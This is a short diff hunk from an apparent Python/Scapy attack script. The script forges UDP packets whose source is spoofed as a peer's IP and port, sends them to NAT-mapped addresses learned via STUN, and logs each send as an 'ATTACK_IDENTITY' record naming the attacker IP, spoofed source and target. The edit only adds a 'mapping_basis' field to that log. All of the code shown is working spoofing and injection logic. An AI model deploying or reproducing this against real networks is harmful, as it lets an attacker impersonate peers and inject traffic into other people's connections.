@@ -24,7 +24,8 @@ for idx,row in enumerate(mappings):
     frame=Ether(src=smac,dst=dmac)/IP(src=row["peer_ip"],dst=row["mapped_ip"],ttl=64,id=0x6200+idx)/UDP(sport=int(row["peer_port"]),dport=int(row["mapped_port"]))/Raw(load=payload)
     b=bytes(frame); check=Ether(b)
     if len(check[IP]) != 20+8+len(payload): raise SystemExit("bad IPv4 total length")
-    rec={"index":idx,"name":row["name"],"attacker_public_ip":attacker_ip,"spoofed_source":f'{row["peer_ip"]}:{row["peer_port"]}',"target":f'{row["mapped_ip"]}:{row["mapped_port"]}',"frame_bytes":len(b),"ipv4_checksum":hex(check[IP].chksum),"udp_checksum":hex(check[UDP].chksum)}
+    rec={"index":idx,"name":row["name"],"attacker_public_ip":attacker_ip,"spoofed_source":f'{row["peer_ip"]}:{row["peer_port"]}',"target":f'{row["mapped_ip"]}:{row["mapped_port"]}',
+        "mapping_basis": row.get("mapping_basis", "direct STUN Binding Success"),"frame_bytes":len(b),"ipv4_checksum":hex(check[IP].chksum),"udp_checksum":hex(check[UDP].chksum)}
     print("ATTACK_IDENTITY="+json.dumps(rec,sort_keys=True),flush=True)
     sendp(frame,iface=iface,count=1,verbose=False)
     records.append(rec)
